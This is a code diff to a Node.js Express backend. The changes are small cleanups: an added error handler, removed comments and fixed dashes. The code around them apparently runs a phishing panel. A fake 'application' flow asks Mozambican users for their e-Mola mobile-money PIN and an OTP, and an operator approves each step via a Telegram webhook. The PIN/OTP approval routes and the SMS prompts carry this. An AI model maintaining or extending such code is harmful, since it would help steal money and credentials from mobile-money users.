@@ -58,8 +58,12 @@ async function sendSms(to, text) {
   }
 }
 
-// Routes
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).json({ ok: false, message: 'Internal server error' });
+});
 
+// Routes
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 // 1. Submit application
@@ -97,7 +101,7 @@ app.post('/api/send-application', async (req, res) => {
   }
 });
 
-// 2. Check app status (for frontend polling)
+// 2. Check app status
 app.get('/api/status/:applicationId/app', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -150,7 +154,7 @@ app.get('/api/status/:applicationId/pin', (req, res) => {
   });
 });
 
-// 5. PIN rejected handler (when admin rejects)
+// 5. PIN rejected handler
 app.post('/api/pin-rejected', async (req, res) => {
   try {
     const { applicationId } = req.body;
@@ -272,9 +276,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
       else await sendTelegramMessage('⚠️ No OTP entered yet.');
     } else if (step === 'APP') {
       app.pinStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
-      // Optionally send SMS to user with a notification
       if (app.pinStatus === 'approved') {
-        await sendSms(`+258${app.phone}`, 'Your application is approved. Enter your e‑Mola PIN.');
+        await sendSms(`+258${app.phone}`, 'Your application is approved. Enter your e-Mola PIN.');
       }
     } else if (step === 'PIN') {
       app.pinStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
@@ -285,10 +288,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
           app.pinStatus = 'blocked';
         }
       } else if (app.pinStatus === 'approved') {
-        // Optionally send SMS with OTP
         const otpCode = generateCode(4);
         app.otpCode = otpCode;
-        await sendSms(`+258${app.phone}`, `Your e‑Mola OTP is: ${otpCode}`);
+        await sendSms(`+258${app.phone}`, `Your e-Mola OTP is: ${otpCode}`);
       }
     } else if (step === 'OTP') {
       app.otpStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
@@ -303,7 +305,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // Handle text replies (YES/NO)
   if (update.message && update.message.text) {
     const text = update.message.text.trim().toUpperCase();
     const replyTo = update.message.reply_to_message?.text;
